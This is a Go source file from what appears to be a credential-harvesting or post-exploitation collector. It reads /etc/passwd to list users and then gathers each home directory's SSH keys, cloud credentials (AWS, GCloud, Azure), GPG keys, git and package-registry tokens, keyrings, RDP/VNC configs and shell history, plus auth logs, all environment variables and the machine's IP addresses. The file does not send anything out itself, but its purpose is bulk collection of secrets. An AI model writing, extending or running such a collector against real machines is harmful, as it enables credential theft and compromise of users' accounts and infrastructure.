package internal

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

// DetectDefaultShell detects the default shell and returns the history file path.
func DetectDefaultShell() string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash" // Default fallback
	}

	switch filepath.Base(shell) {
	case "zsh":
		flushZshHistory()
		return filepath.Join(currentUser.HomeDir, ".zsh_history")
	case "bash":
		return filepath.Join(currentUser.HomeDir, ".bash_history")
	case "ash":
		return filepath.Join(currentUser.HomeDir, ".ash_history")
	case "ksh":
		return filepath.Join(currentUser.HomeDir, ".ksh_history")
	case "tcsh":
		return filepath.Join(currentUser.HomeDir, ".tcsh_history")
	default:
		return "" // Unsupported shell
	}
}

func flushZshHistory() {
	cmd := exec.Command("zsh", "-c", "fc -W")
	if err := cmd.Run(); err != nil {
		// Log the error or document why it is safe to ignore
		fmt.Println("Warning: Failed to flush Zsh history:", err)
	}
}

func rootCheck() bool {
	if os.Geteuid() == 0 {
		return true
	} else {
		return false
	}
}

func getUsersHomedir() []string {
    // array to hold all the users on the system 
    var users []string
    badUsers := []string{"/usr/sbin/nologin", "/bin/sync", "/bin/false",}

	if _, err := os.Stat("/etc/passwd"); err != nil {
		fmt.Printf("[!] Error getting users: %v\n", err)
        return users
    }
    file, err := os.OpenFile("/etc/passwd", os.O_RDONLY, 0644)
    if err != nil {
        fmt.Printf("[!] Error opening file: %v\n", err)
        return users
    }
    defer file.Close()
    
    scanner := bufio.NewScanner(file) 
    for scanner.Scan() {
        line := scanner.Text()
        fields := strings.Split(line, ":")
        if len(fields) < 7 {
            // pass over lines that dont have 7 fields
            continue
        }
        isBadUsers := false
        for _, b := range badUsers {
            if fields[6] == b {
                isBadUsers = true
                break
            }
        }
        if !isBadUsers {
            users = append(users, fields[5])
        }
    }
    if err := scanner.Err(); err != nil {
        fmt.Printf("[!] Error reading file: %v\n", err)
    }

    return users
}



// ScanSensitiveFiles collects all files from specified paths, including full directories.
func ScanSensitiveFiles(outputDir string) ([]string, error) {

	var files []string
	var existingFiles [] string
	// means we can go anywhere
	isRoot := rootCheck()
	// gets the current users home directory
	// what if there are two users, what if we are root, also want to get anything under /home/user
	// homeDir, _ := os.UserHomeDir()
	usersHomeDir := getUsersHomedir()
	
	for _, homeDir := range usersHomeDir {
		if homeDir == "/root" && !isRoot {
			continue
		}
		if _, err := os.Stat(homeDir); err != nil {
			continue
		}

		paths := []string{
			filepath.Join(homeDir, ".ssh"),                   // SSH keys
			filepath.Join(homeDir, ".aws"),                   // AWS credentials
			filepath.Join(homeDir, ".gnupg"),                 // GPG keys
			filepath.Join(homeDir, ".git-credentials"),       // Git credentials
			filepath.Join(homeDir, ".gitconfig"),             // Git global config
			filepath.Join(homeDir, ".docker"),                // Docker config
			filepath.Join(homeDir, ".kube"),                  // Kubernetes config
			filepath.Join(homeDir, ".config/gcloud"),         // Google Cloud config
			filepath.Join(homeDir, ".azure"),                 // Azure config
			filepath.Join(homeDir, ".openvpn"),               // OpenVPN config
			filepath.Join(homeDir, ".profile"),               // User profile
			filepath.Join(homeDir, ".npmrc"),                 // NPM credentials
			filepath.Join(homeDir, ".pypirc"),                // Python package repository credentials
			filepath.Join(homeDir, ".netrc"),                 // Netrc (generic credentials)
			filepath.Join(homeDir, ".config/freerdp"),        // Freerdp files
			filepath.Join(homeDir, ".local/share/remmina"),   // Remmina RDP files
			filepath.Join(homeDir, ".config/remmina"),        // Remmina RDP files
			filepath.Join(homeDir, ".remmina"),               // Remmina RDP files
			filepath.Join(homeDir, ".local/share/keyrings"),  // Keyrings
			filepath.Join(homeDir, ".config/rclone"),         // rclone backup configs
			filepath.Join(homeDir, ".config/rclone_browser"), // rclone_browser configs
			filepath.Join(homeDir, ".vnc"),					  // VNC files 
			"/etc/passwd",        							  // User information
			"/etc/group",                                     // Group information
			"/etc/hostname",                                  // System hostname
			"/etc/hosts",                                     // Hosts file
			"/etc/ssl",                                       // SSL certificates
			"/etc/apache2/apache2.conf",                      // Apache2 config
			"/etc/apache2/sites-enabled",                     // Apache2 sites-enabled
			"/etc/httpd",                                     // httpd configs conf/ and conf.d/
			"/etc/nginx/conf.d",                              // nginx configs
			"/var/log/auth.log",                              // Authentication logs (Linux-specific)
			"/var/log/secure",                                // Secure logs (Red Hat/CentOS-specific)
			"/var/log/wtmp",								  // Authentication logs, source ip
			"/tmp/ssh-*",                                     // Temporary SSH files
			DetectDefaultShell(),                             // Shell history
		}
	
		// var files []string
		for _, path := range paths {
			files = append(files, expandPath(path)...)
		}
	
		// existingFiles := filterExistingFiles(files)
		existingFiles = filterExistingFiles(files)
	}

	// Save system info
	systemInfoPath, err := saveSystemInfo(outputDir)
	if err != nil {
		return nil, err
	}

	// Add system info archive to the files list
	existingFiles = append(existingFiles, systemInfoPath)
	
	return existingFiles, nil
}

// expandPath expands directories into a list of files.
func expandPath(path string) []string {
	var fileList []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		// dont collect symlinks that will be dead
		if err == nil && !info.IsDir() && !filterSymLink(p) {
			fileList = append(fileList, p)
		}
		return nil
	})
	if err != nil {
		return []string{path} // Return the original path if walk fails
	}
	return fileList
}

// filterExistingFiles filters out non-existent or inaccessible files.
func filterExistingFiles(paths []string) []string {
	var existingFiles []string
	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			existingFiles = append(existingFiles, path)
		}
	}
	return existingFiles
}

func filterSymLink(filePath string) bool {
	fileInfo, err := os.Lstat(filePath)
	if err != nil {
		// something bad happened if we cant stat the file we dont want to / cant collect it
		return true
	}
	return fileInfo.Mode()&os.ModeSymlink != 0
}

// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func saveSystemInfo(outputDir string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to serialize system info: %w", err)
	}

	// Create the output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output directory: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(outputDir, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get local IP addresses
	var localIPs []string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
				// add support for ipv6 interface collection
				if ip.IP.To4() != nil || ip.IP.To16() != nil {
					localIPs = append(localIPs, ip.IP.String())
				}
			}
		}
	}
	info["local_ips"] = localIPs

	// Get public IP address
	publicIP, err := getPublicIP()
	if err == nil {
		info["public_ip"] = publicIP
	} else {
		info["public_ip"] = "N/A"
	}

	return info, nil
}

// getPublicIP fetches the public IP address of the system.
func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, err = buf.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}

	return buf.String(), nil
}
